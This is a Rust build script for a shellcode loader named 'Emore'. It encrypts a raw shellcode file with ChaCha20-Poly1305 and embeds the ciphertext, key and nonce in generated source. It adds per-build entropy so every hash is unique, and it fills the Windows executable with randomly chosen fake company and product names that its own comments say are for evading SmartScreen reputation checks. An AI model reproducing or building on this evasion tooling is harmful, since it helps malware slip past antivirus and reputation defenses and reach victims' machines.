use chacha20poly1305::{
    aead::{Aead, KeyInit}, // Characteristics for Authenticated Encryption with Associated Data (AEAD)
    ChaCha20Poly1305, Key, Nonce, // The specific cipher struct and types for Key/Nonce
};
use rand::RngCore; // Characteristics that defines methods for generating random data (like fill_bytes)
use rand::rngs::OsRng; // The OS-specific Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)
use rand::Rng; // For random number generation
use std::env; // To access environment variables (specifically OUT_DIR)
use std::fs; // For file system operations (reading/writing files)
use std::io::Write; // Characteristics for writing data to streams/files
use std::path::Path; // For handling file paths in a cross-platform way

// BASE64 ENGINE IMPORTS
use base64::engine::Engine as _; // Import the Engine Characteristics to use encoding methods
use base64::engine::general_purpose::STANDARD; // The standard Base64 alphabet engine


fn main() {
    // Send out a warning to the Cargo output to indicate the build script has started
    println!("cargo:warning=--- Emore BUILD.RS STARTED ---"); 
    
    // === PE Metadata Randomization for SmartScreen Evasion ===
    randomize_pe_metadata();
    
    // 1. Define the path to the raw shellcode file
    let payload_path = Path::new("payload.bin"); // Ensure this file exists in the project root
    
    // Instruct Cargo to re-run this build script only if "payload.bin" changes
    println!("cargo:rerun-if-changed={}", payload_path.display()); // Optimization to avoid unnecessary rebuilds

    // 2. Read the raw shellcode bytes into memory
    let shellcode = fs::read(payload_path)
        .expect("Error: payload.bin not found or could not be read. Ensure it exists in the project root.");
        
    println!("cargo:warning=Shellcode read successfully, size: {} bytes", shellcode.len()); 
    
    // 3. Generate a random Encryption Key and Nonce
    // We instantiate the OS Random Number Generator
    let mut rng = OsRng::default();

    // Generate a random 32-byte (256-bit) Key
    let mut key_bytes = [0u8; 32];
    RngCore::fill_bytes(&mut rng, &mut key_bytes); // Fill the key_bytes array with random data because ChaCha20-Poly1305 requires a 256-bit key
    let key = Key::from_slice(&key_bytes); // Convert the byte array into a Key type for the cipher

    // Generate a random 12-byte (96-bit) Nonce (Number used ONCE)
    let mut nonce_bytes = [0u8; 12];
    RngCore::fill_bytes(&mut rng, &mut nonce_bytes); 
    let nonce = Nonce::from_slice(&nonce_bytes);

    // 4. Initialize the ChaCha20-Poly1305 cipher and encrypt the payload
    // This provides both confidentiality (encryption) and integrity (Poly1305 MAC)
    let cipher = ChaCha20Poly1305::new(key); // Define the cipher with the generated key
    let ciphertext_vec = cipher // Define the ciphertext vector by encrypting the shellcode
        .encrypt(nonce, shellcode.as_ref())
        .expect("Payload encryption failed!");

    // 5. Encode the encrypted binary data into a Base64 string
    // This ensures the binary data can be safely stored as a string literal in the source code
    let ciphertext_base64 = STANDARD.encode(ciphertext_vec); 
    
    // 6. Generate the Rust source file containing the constants
    // Retrieve the build output directory path managed by Cargo
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("payload_data.rs"); 

    let mut file = fs::File::create(&dest_path).expect("Could not create payload_data.rs file");
    
    // Write the constants (Base64 ciphertext, Key, and Nonce) to the file
    // These will be included by main.rs at compile time
    writeln!(
        file,
        "pub const ENCRYPTED_PAYLOAD_BASE64: &str = \"{}\";",  // Write the Base64 encoded ciphertext to the file
        ciphertext_base64
    ).unwrap(); // Unwrap to handle any potential write errors
    writeln!(file, "pub const PAYLOAD_KEY: [u8; 32] = {:?};", key_bytes).unwrap();
    writeln!(file, "pub const PAYLOAD_NONCE: [u8; 12] = {:?};", nonce_bytes).unwrap();
    
    // === Add Random Entropy Padding ===
    // Generate random padding bytes to ensure unique hash per build
    let mut entropy_bytes = vec![0u8; rng.gen_range(16..64)];
    RngCore::fill_bytes(&mut rng, &mut entropy_bytes);
    writeln!(file, "pub const BUILD_ENTROPY: &[u8] = &{:?};", entropy_bytes).unwrap();
    
    // Notify completion
    println!("cargo:warning=--- Emore: Shellcode successfully encrypted in {}", dest_path.display());
    println!("cargo:warning=--- Emore BUILD.RS FINISHED ---");
}

// Randomize PE metadata to bypass SmartScreen reputation checks
fn randomize_pe_metadata() {
    if cfg!(target_os = "windows") {
        let mut rng = OsRng::default();
        
        // Random version components (1-9.0-99.0-999)
        let major = rng.gen_range(1..10);
        let minor = rng.gen_range(0..100);
        let patch = rng.gen_range(0..1000);
        
        // Pool of legitimate-sounding company names
        let companies = [
            "Synergy Technologies Inc",
            "Digital Solutions Corp",
            "Quantum Systems LLC",
            "Apex Software Group",
            "Nexus Innovations Ltd",
            "Vertex Technology Partners",
            "Horizon Software Solutions",
            "Phoenix Digital Systems",
            "Atlas Computing Inc",
            "Meridian Tech Group",
        ];
        
        // Pool of legitimate-sounding product names
        let products = [
            "System Performance Monitor",
            "Network Optimization Tool",
            "Application Manager",
            "Resource Analyzer",
            "Diagnostic Utility",
            "Configuration Assistant",
            "System Health Monitor",
            "Service Controller",
            "Process Optimizer",
            "Performance Analyzer",
        ];
        
        let company = companies[rng.gen_range(0..companies.len())];
        let product = products[rng.gen_range(0..products.len())];
        
        // Build resource script
        let mut res = winres::WindowsResource::new();
        
        // Only set icon if it exists
        if Path::new("icon.ico").exists() {
            res.set_icon("icon.ico");
        }
        
        res.set("CompanyName", company)
            .set("FileDescription", product)
            .set("FileVersion", &format!("{}.{}.{}", major, minor, patch))
            .set("ProductName", product)
            .set("ProductVersion", &format!("{}.{}.{}", major, minor, patch))
            .set("LegalCopyright", &format!("Copyright (C) {} 2024-2025", company))
            .set("OriginalFilename", "emore.exe");
        
        // Compile resources
        match res.compile() {
            Ok(_) => println!("cargo:warning=PE metadata randomized: {} v{}.{}.{}", product, major, minor, patch),
            Err(_) => println!("cargo:warning=PE metadata generation skipped (winres unavailable)"),
        }
    }
}